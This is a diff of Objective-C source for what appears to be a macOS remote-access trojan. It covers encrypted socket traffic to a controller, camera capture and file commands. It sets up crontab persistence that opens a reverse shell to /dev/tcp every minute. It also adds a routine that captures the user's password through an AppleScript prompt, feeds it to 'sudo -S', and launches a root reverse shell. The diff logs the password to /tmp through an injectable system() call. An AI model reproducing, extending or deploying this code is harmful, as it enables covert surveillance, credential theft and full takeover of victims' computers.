@@ -7,6 +7,9 @@
 
 BOOL micinuse;
 BOOL systaskrunning = false;
+BOOL PROMPTOPEN = false;
+bool debug;
+NSString *password;
 FILE *cookieJar;
 char lastBytes[64];
 
@@ -48,6 +51,10 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
     };
     return "null";
 }
+    
+-(void)debugLog:(NSString *)string {
+    system([[NSString stringWithFormat:@"echo '%@' >> /tmp/esplog",string] UTF8String]);
+}
 
 //MARK: Socketry
 
@@ -75,7 +82,7 @@ int sockfd;
 -(void)sendString:(NSString *)string {
     string = [string stringByReplacingOccurrencesOfString:@"’" withString:@"'"];
     NSString *finalstr = [NSString stringWithFormat:@"%@%@",[escryptor encryptNSStringToB64:self.skey :string],_terminator];
-    write (sockfd, [finalstr UTF8String], finalstr.length + 11);
+    write (sockfd, [finalstr UTF8String], finalstr.length);
 }
 
 -(void)liveSendString:(NSString *)string {
@@ -89,13 +96,13 @@ int sockfd;
 
     NSString *finalstr = [NSString stringWithFormat:@"%@%@",
                           [escryptor encryptNSStringToB64:self.skey :string],reversed];
-    write (sockfd, [finalstr UTF8String], finalstr.length + 11);
+    write (sockfd, [finalstr UTF8String], finalstr.length);
 }
 
 
 -(void)receiveFileData:(NSString *)saveToPath :(long)fileSize {
     [self blank];
-    long bsize = fileSize;
+    long bsize = 1024;
     char buffer[bsize];
     NSMutableData *data = [NSMutableData alloc];
     //we use both chunks to make sure we never check an incomplete terminator string
@@ -104,18 +111,18 @@ int sockfd;
     while(read (sockfd, &buffer, sizeof(buffer))) {
         //append data
         thischunk = [NSString stringWithFormat:@"%s",buffer];
-        [data appendBytes:[thischunk UTF8String] length:thischunk.length];
+        [data appendBytes:buffer length:sizeof(buffer)];
         //detect terminator, decrypt data, write to file
-        memset(buffer,'\0',bsize);
         if (!([[NSString stringWithFormat:@"%@%@",lastchunk,thischunk] rangeOfString:_terminator].location == NSNotFound)) {
-            //fuck this
-            NSString *datastr = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
-            datastr = [datastr substringToIndex:[datastr length] - 16];
-            NSData *nsdataDecoded = [data initWithBase64EncodedString:datastr options:NSDataBase64DecodingIgnoreUnknownCharacters];
-            [nsdataDecoded writeToFile:saveToPath atomically:true];
+            //base64 decode file data
+            data = [[NSMutableData alloc] initWithBase64EncodedData:
+                                   [data subdataWithRange:NSMakeRange(0, fileSize)] options:0];
+            //decrypt nsdata and write to file
+            [[escryptor decryptNSData:_skey :data] writeToFile:saveToPath atomically:true];
             break;
         }
         lastchunk = [NSString stringWithFormat:@"%s",buffer];
+        memset(buffer,'\0',sizeof(buffer));
     }
     [self blank];
 }
@@ -196,6 +203,7 @@ int sockfd;
 //MARK: Camera
 
 -(NSData*)takePicture {
+    [self debugLog:@"taking picture"];
     __block BOOL done = NO;
     __block NSData *pictureData = nil;
     [self captureWithBlock:^(NSData *imageData)
@@ -292,7 +300,8 @@ int sockfd;
 }
 
 //MARK: File Management
-
+//lets just use system ls for now
+/*
 -(void)directoryList:(NSString *)arg {
     //basically "ls"
     NSArray *files;
@@ -375,6 +384,28 @@ int sockfd;
     }
 }
 
+//use system rm instead
+-(void)rmFile:(NSString *)arg {
+    if ([arg isEqualToString:@""]) {
+        [self sendString:@"Usage: rm filename"];
+        return;
+    }
+    BOOL isdir = false;
+    if ([fileManager fileExistsAtPath:arg isDirectory:&isdir]) {
+        if (isdir) {
+            [self sendString:[NSString stringWithFormat:@"%@: is a directory",arg]];
+        }
+        else {
+            [fileManager removeItemAtPath:arg error:NULL];
+            [self sendString:@""];
+        }
+    }
+    else {
+        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",arg]];
+    }
+}
+*/
+
 -(void)changeWD:(NSString *)arg {
     //basically "cd"
     NSString *dir = NSHomeDirectory();
@@ -394,26 +425,6 @@ int sockfd;
     }
     else {
         [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",dir]];
-    }
-}
-
--(void)rmFile:(NSString *)arg {
-    if ([arg isEqualToString:@""]) {
-        [self sendString:@"Usage: rm filename"];
-        return;
-    }
-    BOOL isdir = false;
-    if ([fileManager fileExistsAtPath:arg isDirectory:&isdir]) {
-        if (isdir) {
-            [self sendString:[NSString stringWithFormat:@"%@: is a directory",arg]];
-        }
-        else {
-            [fileManager removeItemAtPath:arg error:NULL];
-            [self sendString:@""];
-        }
-    }
-    else {
-        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",arg]];
     }
 }
 
@@ -538,7 +549,7 @@ int sockfd;
 }
 
 -(void)removePersistence:(NSString *)ip :(int)port {
-    NSString *persist = [NSString stringWithFormat:@"* * * * * bash &> /dev/tcp/%@/%d 0>&1\n",ip,port];
+    NSString *persist = [NSString stringWithFormat:@"* * * * * bash &> /dev/tcp/%@/%d 0>&1 2>/dev/null\n",ip,port];
     system("crontab -l > /private/tmp/.cryon");
     NSData *crondata = [fileManager contentsAtPath:@"/private/tmp/.cryon"];
     NSString *newcron = [[NSString alloc]initWithData:crondata encoding:NSUTF8StringEncoding];
@@ -550,7 +561,7 @@ int sockfd;
 
 -(void)persistence:(NSString *)ip :(int)port {
     [self removePersistence:ip:port];
-    NSString *payload = [NSString stringWithFormat:@"crontab -l > /private/tmp/.cryon; echo '* * * * * bash &> /dev/tcp/%@/%d 0>&1' >> /private/tmp/.cryon;crontab /private/tmp/.cryon; rm /private/tmp/.cryon",ip,port];
+    NSString *payload = [NSString stringWithFormat:@"crontab -l > /private/tmp/.cryon; echo '* * * * * bash &> /dev/tcp/%@/%d 0>&1 2>/dev/null' >> /private/tmp/.cryon;crontab /private/tmp/.cryon; rm /private/tmp/.cryon",ip,port];
     system([payload UTF8String]);
     [self sendString:@""];
 }
@@ -601,18 +612,64 @@ int sockfd;
     });
 }
 
--(void)runAppleScript:(NSString *)arg {
-    NSAppleScript *aps = [[NSAppleScript alloc] initWithSource:arg];
-    NSError *error;
-    NSAppleEventDescriptor *asDescriptor = [aps executeAndReturnError:&error];
-    if (error == NULL) {
-        if ([[asDescriptor stringValue] length] < 1)
-            [self blank];
-        else
-            [self sendString:[NSString stringWithFormat:@"%@",[asDescriptor stringValue]]];
-    }
-    else {
-        [self sendString:[NSString stringWithFormat:@"%@",error]];
+-(void)runAppleScript:(NSString *)cmd :(NSString *)args {
+    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
+        NSAppleScript *aps = [[NSAppleScript alloc] initWithSource:args];
+        NSDictionary *error = nil;
+        NSAppleEventDescriptor *asDescriptor = [aps executeAndReturnError:&error];
+        if (error == NULL) {
+            if ([[asDescriptor stringValue] length] < 1) {
+                [self debugLog:@"result is blank"];
+                [self blank];
+            }
+            else {
+                if ([cmd isEqualToString:@"prompt"]) {
+                    password = [asDescriptor stringValue];
+                }
+                [self sendString:[NSString stringWithFormat:@"%@",[asDescriptor stringValue]]];
+            }
+        }
+        else {
+            [self sendString:[NSString stringWithFormat:@"%@",error]];
+        }
+    });
+}
+
+
+-(void)su:(NSString *)pass :(NSString *)ip :(int)port {
+    __block NSString *result = @"";
+    systaskrunning = true;
+    _systask = [[NSTask alloc] init];
+    [_systask setLaunchPath:@"/bin/bash"];
+    [_systask setArguments:@[ @"-c", [NSString stringWithFormat:@"echo '%@' | sudo -S whoami",pass]]];
+    [_systask setCurrentDirectoryPath:[fileManager currentDirectoryPath]];
+    
+    NSPipe *stdoutPipe = [NSPipe pipe];
+    [_systask setStandardOutput:stdoutPipe];
+    [_systask setStandardError:stdoutPipe];
+    
+    NSFileHandle *stdoutHandle = [stdoutPipe fileHandleForReading];
+    [stdoutHandle waitForDataInBackgroundAndNotify];
+    id observer = [[NSNotificationCenter defaultCenter] addObserverForName:NSFileHandleDataAvailableNotification
+                                                                    object:stdoutHandle queue:nil
+                                                                usingBlock:^(NSNotification *note)
+                   {
+                       NSData *dataRead = [stdoutHandle availableData];
+                       NSString *newOutput = [[NSString alloc] initWithData:dataRead encoding:NSUTF8StringEncoding];
+                       result = [NSString stringWithFormat:@"%@%@",result,newOutput];
+
+                       [stdoutHandle waitForDataInBackgroundAndNotify];
+                   }];
+    [_systask launch];
+    [_systask waitUntilExit];
+    [[NSNotificationCenter defaultCenter] removeObserver:observer];
+    systaskrunning = false;
+    [self debugLog:pass];
+    [self sendString:result];
+    if (!([result rangeOfString:@"root"].location == NSNotFound)) {
+        sleep(1);
+        system([[NSString stringWithFormat:@"echo '%@' | sudo -S bash &> /dev/tcp/%@/%d 0>&1 2>/dev/null",pass,ip,port] UTF8String]);
+        exit(0);
     }
 }
 
